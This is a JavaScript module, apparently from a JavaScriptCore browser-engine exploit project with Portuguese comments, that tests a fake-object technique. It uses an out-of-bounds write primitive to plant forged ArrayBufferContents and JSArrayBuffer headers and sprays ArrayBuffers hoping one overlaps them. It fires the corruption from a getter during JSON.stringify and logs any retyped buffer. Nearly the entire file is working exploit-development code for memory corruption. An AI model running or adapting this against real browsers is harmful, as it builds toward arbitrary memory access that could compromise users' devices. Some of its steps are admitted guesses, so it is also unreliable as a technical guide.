// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForAggressiveFakeObj";
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", error: null, details: "" };

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Metadados sombra (ArrayBufferContents falsos)
const FAKE_CONTENTS_DATA_PTR = new AdvancedInt64(0x1, 0x0); // Para causar crash se lido
const FAKE_CONTENTS_SIZE = new AdvancedInt64(0x7FFFFFF0, 0x0); // Tamanho gigante
const OFFSET_FOR_FAKE_CONTENTS = 0x300; // Onde plantaremos os ArrayBufferContents falsos dentro do oob_ab

class CheckpointForAggroFakeObj {
    constructor(id) {
        this.id_marker = `AggroFakeObjCheckpoint-${id}`;
    }
    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "AggroFakeObj_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Tentando Fake Object agressivo...`, "vuln", FNAME_GETTER);
        current_test_results = { success: false, message: "Getter chamado.", error: null, details: "" };
        let details_log = [];

        try {
            if (!oob_array_buffer_real || !oob_write_absolute || !JSC_OFFSETS.ArrayBuffer || !JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.JSCell) {
                throw new Error("Dependências não disponíveis (OOB R/W, Offsets).");
            }
            const arrayBufferStructureID_val = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID; // Ex: 2

            // 1. Plantar os ArrayBufferContents falsos em um local conhecido do oob_array_buffer_real
            oob_write_absolute(OFFSET_FOR_FAKE_CONTENTS + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, FAKE_CONTENTS_SIZE, 8);
            oob_write_absolute(OFFSET_FOR_FAKE_CONTENTS + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, FAKE_CONTENTS_DATA_PTR, 8);
            details_log.push(`Fake ArrayBufferContents plantados em oob_data[${toHex(OFFSET_FOR_FAKE_CONTENTS)}] (ptr=${FAKE_CONTENTS_DATA_PTR.toString(true)}, size=${FAKE_CONTENTS_SIZE.toString(true)})`);

            // 2. Tentar criar um "Fake JSArrayBuffer Object" em vários locais dentro do oob_array_buffer_real
            //    e depois alocar ArrayBuffers reais na esperança de uma sobreposição.
            const FAKE_JS_OBJECT_STRUCTURE_ID_FIELD = JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET; // Ou STRUCTURE_POINTER_OFFSET se estivermos escrevendo um ponteiro real
            const FAKE_JS_OBJECT_IMPL_PTR_FIELD = JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET;
            
            // O VALOR que queremos escrever no m_impl é o *offset dentro do oob_array_buffer_real*
            // onde os FAKE_CONTENTS estão. Isso só funcionaria se o JSC tratasse esse offset
            // como um ponteiro relativo à base do oob_array_buffer_real (improvável para m_impl).
            // Uma abordagem mais correta seria escrever o endereço absoluto de 
            // (oob_array_buffer_real_base_address + OFFSET_FOR_FAKE_CONTENTS), o que requer addrof.
            // Para este teste, vamos escrever o offset relativo como um número.
            const pointer_to_fake_contents_relative = new AdvancedInt64(OFFSET_FOR_FAKE_CONTENTS, 0);

            let sprayed_abs_victims = [];
            const spray_attempts = 30; // Quantas vezes tentamos plantar o objeto falso e depois alocar
            const num_abs_per_attempt = 5; // Quantos ABs alocar após cada tentativa de plantar o objeto falso

            for (let attempt = 0; attempt < spray_attempts; attempt++) {
                // Escolher um offset para plantar o Fake JSArrayBuffer Object dentro do oob_array_buffer_real
                // Este offset precisa ser grande o suficiente para não sobrescrever o início (0x70) ou os fake_contents (0x300)
                let offset_fake_jsobject = 0x400 + (attempt * 0x20); // Espalhar as tentativas
                if (offset_fake_jsobject + 0x20 > oob_array_buffer_real.byteLength) break; // Evitar OOB no próprio oob_ab

                details_log.push(`Tentativa ${attempt}: Plantando Fake JSArrayBuffer em oob_data[${toHex(offset_fake_jsobject)}] para apontar para FakeContents em oob_data[${toHex(OFFSET_FOR_FAKE_CONTENTS)}]`);
                
                // Escrever StructureID (ou ponteiro)
                // NOTA: Escrever apenas o ID (ex: 2) onde um ponteiro de Structure é esperado é geralmente incorreto.
                //       Mas é a melhor tentativa sem um ponteiro de Structure válido e conhecido.
                oob_write_absolute(offset_fake_jsobject + FAKE_JS_OBJECT_STRUCTURE_ID_FIELD, arrayBufferStructureID_val, 4); // Escreve o ID como u32
                
                // Escrever o ponteiro para os Fake ArrayBufferContents
                oob_write_absolute(offset_fake_jsobject + FAKE_JS_OBJECT_IMPL_PTR_FIELD, pointer_to_fake_contents_relative, 8);

                // Alocar alguns ArrayBuffers reais. A esperança é que um deles seja alocado
                // sobre a estrutura Fake JSArrayBuffer que acabamos de escrever.
                let current_spray_batch = [];
                for (let j = 0; j < num_abs_per_attempt; j++) {
                    try {
                        current_spray_batch.push(new ArrayBuffer(64));
                    } catch (e_alloc_spray) { /* ignorar */ }
                }
                sprayed_abs_victims.push(...current_spray_batch);
            }
            details_log.push(`Total de ${sprayed_abs_victims.length} ArrayBuffers vítimas pulverizados após tentativas de plantar Fake JSObject.`);

            // 3. Verificar todos os ArrayBuffers pulverizados
            let corruption_successful = false;
            for (let i = 0; i < sprayed_abs_victims.length; i++) {
                const victim = sprayed_abs_victims[i];
                if (!victim) continue;
                let current_victim_len = -1;
                try {
                    current_victim_len = victim.byteLength;
                    if (i < 10 || current_victim_len !== 64) { // Logar os primeiros e qualquer um com tamanho diferente
                        details_log.push(`Verificando sprayed_abs_victims[${i}].byteLength: ${current_victim_len}`);
                    }

                    if (current_victim_len === FAKE_CONTENTS_SIZE.low()) {
                        logS3(`DENTRO DO GETTER: SUCESSO! sprayed_abs_victims[${i}].byteLength (${current_victim_len}) CORRESPONDE ao tamanho sombra!`, "vuln", FNAME_GETTER);
                        const dv = new DataView(victim);
                        dv.getUint32(0, true); // Tenta ler de FAKE_CONTENTS_DATA_PTR (0x1) - ESPERA-SE CRASH/ERRO
                        current_test_results = { success: true, message: `sprayed_abs_victims[${i}] RE-TIPADO (size OK)! Leitura de ${FAKE_CONTENTS_DATA_PTR.toString(true)} NÃO CRASHOU.`, error: null, details: details_log.join('; ') };
                        corruption_successful = true;
                        break; 
                    }
                } catch (e_check) {
                    details_log.push(`Erro/Crash ao usar sprayed_abs_victims[${i}] (len antes do erro: ${current_victim_len}): ${e_check.message}`);
                    logS3(`DENTRO DO GETTER: Erro/Crash com sprayed_abs_victims[${i}] (len: ${current_victim_len}): ${e_check.message}`, "error", FNAME_GETTER);
                    if (current_victim_len === FAKE_CONTENTS_SIZE.low() &&
                        (String(e_check.message).toLowerCase().includes("rangeerror") || String(e_check.message).toLowerCase().includes("memory access"))) {
                        current_test_results = { success: true, message: `sprayed_abs_victims[${i}] RE-TIPADO (size OK) e CRASH CONTROLADO ('${e_check.message}') ao ler de ${FAKE_CONTENTS_DATA_PTR.toString(true)}!`, error: String(e_check), details: details_log.join('; ') };
                        corruption_successful = true;
                        logS3(`DENTRO DO GETTER: ${current_test_results.message}`, "vuln", FNAME_GETTER);
                        break;
                    }
                }
            }

            if (!corruption_successful) {
                current_test_results.message = "Nenhuma corrupção bem-sucedida nos ArrayBuffers pulverizados para usar o Fake JSObject / Fake Contents.";
            }
            current_test_results.details = details_log.join('; ');

        } catch (e) {
            logS3(`DENTRO DO GETTER: ERRO GERAL: ${e.message}`, "error", FNAME_GETTER);
            current_test_results.error = String(e);
            current_test_results.message = `Erro geral no getter: ${e.message}`;
        }
        return 0xBADF00D;
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForAggroFakeObj.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_aggro_fakeobj_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() {
    const FNAME_TEST = "executeAggressiveFakeObjectTest";
    logS3(`--- Iniciando Teste Agressivo de Fake Object no Getter ---`, "test", FNAME_TEST);

    getter_called_flag = false;
    current_test_results = { success: false, message: "Teste não executado.", error: null, details: "" };

    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID || !JSC_OFFSETS.JSCell) {
        logS3("Offsets JSC críticos ausentes.", "critical", FNAME_TEST);
        return;
    }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { logS3("OOB Init falhou.", "critical", FNAME_TEST); return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST);

        const checkpoint_obj = new CheckpointForAggroFakeObj(1);
        logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) { logS3(`Erro em JSON.stringify: ${e.message}`, "error", FNAME_TEST); }

    } catch (mainError) {
        logS3(`Erro principal no teste: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
    } finally {
        logS3("Limpeza finalizada.", "info", "CleanupFinal");
    }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE FAKE OBJECT AGRESSIVO: SUCESSO! ${current_test_results.message}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO TESTE FAKE OBJECT AGRESSIVO: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST);
        }
        if (current_test_results.details) {
             logS3(`  Detalhes da tentativa: ${current_test_results.details}`, "info", FNAME_TEST);
        }
    } else {
        logS3("RESULTADO TESTE FAKE OBJECT AGRESSIVO: Getter NÃO foi chamado.", "error", FNAME_TEST);
    }

    clearOOBEnvironment();
    logS3(`--- Teste Agressivo de Fake Object Concluído ---`, "test", FNAME_TEST);
}
